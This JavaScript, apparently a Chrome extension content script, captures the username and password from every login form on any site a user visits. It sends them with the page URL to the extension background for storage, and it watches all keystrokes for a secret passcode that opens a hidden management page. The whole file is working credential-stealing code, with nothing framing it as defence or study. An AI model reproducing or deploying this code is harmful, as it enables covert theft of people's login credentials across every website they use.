function monitorSubmissions() {

    var fields = document.getElementsByTagName('input');

    for (var f = 0; f < fields.length; f++) {

        // monitor forms which have a `password` field
        if (fields[f].form && fields[f].type == 'password') {

            fields[f].form.addEventListener('submit', function() {

                var user; // username or email
                var pass; // password

                var children = this.getElementsByTagName('input');

                // find likely `user` & `pass` elements
                for (var c = 0; c < children.length; c++) {

                    var i = children[c];

                    if (! i.value || ! i.type)
                        continue;
                    if (i.type == 'password' && ! pass)
                        pass = i.value;
                    if (i.type == 'text' || i.type == 'email' && ! user)
                        user = i.value;
                    if (pass && user)
                        break;
                }

                if (user && pass) {

                    // post credentials to background
                    chrome.extension.sendRequest({
                        action: 'queryDatabase',
                        crud: 'create',
                        record: [
                            window.location.href,
                            window.location.hostname,
                            user,
                            pass
                        ]
                    });
                }
            });
        }
    }
}

function monitorKeystrokes() {

    var passcode; // extension passcode
    var progress = 0; // characters of passcode matched

    // request passcode from localStorage
    chrome.extension.sendRequest({action: 'getPasscode'}, function(response) {
        passcode = response.toUpperCase();
    });

    window.addEventListener('keydown', function(event) {

        // compare input with expected charCode
        if (event.which == passcode.charCodeAt(progress)) {

            if (progress == passcode.length - 1) {

                // request to open the `manage` page
                chrome.extension.sendRequest({action: 'openManage'});

            } else {
                progress++;
                return true;
            }
        }

        progress = 0;
    });
}

monitorSubmissions(); // monitor submissions for login credentials
monitorKeystrokes(); // monitor keystrokes for extension passcode